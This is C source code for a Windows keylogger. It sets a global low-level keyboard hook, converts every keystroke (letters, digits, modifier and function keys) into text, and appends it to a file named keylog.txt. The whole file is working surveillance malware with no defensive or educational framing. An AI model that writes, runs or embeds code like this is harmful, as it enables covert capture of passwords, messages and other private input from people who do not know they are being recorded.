#include <windows.h>
#include <stdio.h>
#include <string.h>

HHOOK hHook;
char logBuffer[1024] = ""; // Buffer to hold the gibberish string

// Function to check if a key is pressed
int isKeyPressed(int vKey) {
    return (GetKeyState(vKey) & 0x8000) != 0;
}

// Function to convert virtual key code to character or functional key name
void convertKeyCodeToLog(KBDLLHOOKSTRUCT *pKey) {
    char c;
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    switch (pKey->vkCode) {
        case VK_RETURN:
            strcat(logBuffer, "<Enter>\n");
            break;
        case VK_BACK:
            strcat(logBuffer, "<Backspace>");
            break;
        case VK_TAB:
            strcat(logBuffer, "<Tab>");
            break;
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            strcat(logBuffer, "<Shift>");
            break;
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            strcat(logBuffer, "<Ctrl>");
            break;
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:
            strcat(logBuffer, "<Alt>");
            break;
        case VK_ESCAPE:
            strcat(logBuffer, "<Esc>");
            break;
        case VK_SPACE:
            strcat(logBuffer, " "); // Add a whitespace character for Space key
            break;
        case VK_F1: case VK_F2: case VK_F3: case VK_F4:
        case VK_F5: case VK_F6: case VK_F7: case VK_F8:
        case VK_F9: case VK_F10: case VK_F11: case VK_F12:
            sprintf(logBuffer + strlen(logBuffer), "<F%d>", pKey->vkCode - VK_F1 + 1);
            break;
        default:
            // Handle alphanumeric keys
            if ((pKey->vkCode >= 'A' && pKey->vkCode <= 'Z') || (pKey->vkCode >= '0' && pKey->vkCode <= '9')) {
                // Check if Shift or Caps Lock is pressed
                if (isKeyPressed(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001)) {
                    c = pKey->vkCode; // Uppercase
                } else {
                    c = pKey->vkCode + 32; // Lowercase
                }
                int len = strlen(logBuffer);
                logBuffer[len] = c;
                logBuffer[len + 1] = '\0';
            } else {
                // For other non-alphanumeric keys, just map using ToAscii
                WORD ascii;
                if (ToAscii(pKey->vkCode, pKey->scanCode, keyboardState, &ascii, 0) == 1) {
                    int len = strlen(logBuffer);
                    logBuffer[len] = (char)ascii;
                    logBuffer[len + 1] = '\0';
                }
            }
            break;
    }
}

// Function to write the buffer to the file and clear it
void writeBufferToFile() {
    FILE *logFile = fopen("keylog.txt", "a+");
    if (logFile != NULL) {
        fprintf(logFile, "%s", logBuffer);
        fclose(logFile);
        logBuffer[0] = '\0'; // Clear the buffer
    }
}

LRESULT CALLBACK KeyloggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;
        convertKeyCodeToLog(pKey);

        // Write buffer to file immediately for simplicity
        writeBufferToFile();
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyloggerProc, NULL, 0);
    if (hHook == NULL) {
        printf("Failed to set hook!\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}
